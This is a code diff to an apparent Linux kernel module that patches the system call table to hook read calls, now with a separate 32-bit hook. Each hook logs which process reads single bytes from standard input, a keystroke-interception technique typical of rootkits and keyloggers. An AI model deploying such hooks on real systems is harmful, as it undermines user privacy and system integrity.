@@ -16,6 +16,12 @@ asmlinkage long hooked_sys_read(unsigned int fd, char __user *buf, size_t count)
 		printk(KERN_INFO "intercepted sys_read from %s\n", current->comm);
 	return real_sys_read(fd, buf, count);
 }
+asmlinkage long (*real_sys_read32)(unsigned int fd, char __user *buf, size_t count);
+asmlinkage long hooked_sys_read32(unsigned int fd, char __user *buf, size_t count){
+	if(count == 1 && fd == 0)
+		printk(KERN_INFO "intercepted sys_read32 from %s\n", current->comm);
+	return real_sys_read32(fd, buf, count);
+}
 
 void hook_calls(void){
 	sys_call_table = get_writable_sct(get_sys_call_table());
@@ -36,7 +42,7 @@ void hook_calls(void){
 
 	HOOK(__NR_read, real_sys_read, hooked_sys_read);
 #ifdef __NR_read32
-	HOOK_IA32(__NR_read32, real_sys_read, hooked_sys_read);
+	HOOK_IA32(__NR_read32, real_sys_read32, hooked_sys_read32);
 #endif
 
 
@@ -49,7 +55,7 @@ void unhook_calls(void){
 
 	UNHOOK(__NR_read, real_sys_read);
 #ifdef __NR_read32
-	UNHOOK_IA32(__NR_read32, real_sys_read);
+	UNHOOK_IA32(__NR_read32, real_sys_read32);
 #endif
 
 
